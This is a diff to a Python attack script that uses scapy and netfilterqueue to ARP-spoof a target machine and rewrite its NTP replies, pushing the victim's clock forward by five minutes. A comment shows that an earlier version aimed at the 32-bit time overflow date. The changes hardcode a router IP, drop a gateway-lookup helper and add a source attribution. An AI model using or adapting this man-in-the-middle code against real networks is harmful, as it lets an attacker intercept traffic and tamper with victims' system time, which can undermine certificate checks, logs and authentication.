@@ -1,3 +1,7 @@
+'''
+This code is a modified version from https://gist.github.com/0x6d69636b/0c79bb3b5bcf03d8c6e9cae3a0891a97
+'''
+
 #!/usr/bin/env python3
 
 '''
@@ -14,11 +18,7 @@ from subprocess import Popen, DEVNULL
 import datetime
 from scapy.all import IP, UDP, NTP
 from netfilterqueue import NetfilterQueue
-
-
-def get_switch_ip():    
-    cmd = "route -n | grep ^0.0.0.0 | cut -d \" \" -f 10"
-    return subprocess.check_output(cmd, shell=True, universal_newlines=True).rstrip()    
+ 
 
 
 SYSTEM_EPOCH = datetime.date(*time.gmtime(0)[0:3])
@@ -37,7 +37,7 @@ def system_to_ntp_time(date):
 
 # SET TIME TO END OF THE 32-bit DAYS
 def upgrade_year(dtime):
-    #new_time = datetime.datetime(2025, 1, 18, 23, 59, dtime.second, dtime.microsecond)
+    #modified to change time by 5 minutes
     new_time = dtime + datetime.timedelta(minutes=5)
     return new_time.timestamp()
 
@@ -104,6 +104,7 @@ if __name__ == '__main__':
 
     # calculate IP addresses
     ip_addr = sys.argv[1]
+    #change to your router IP
     router_ip = '192.168.0.100'
 
     print('Running ARP spoofing for target:', ip_addr,
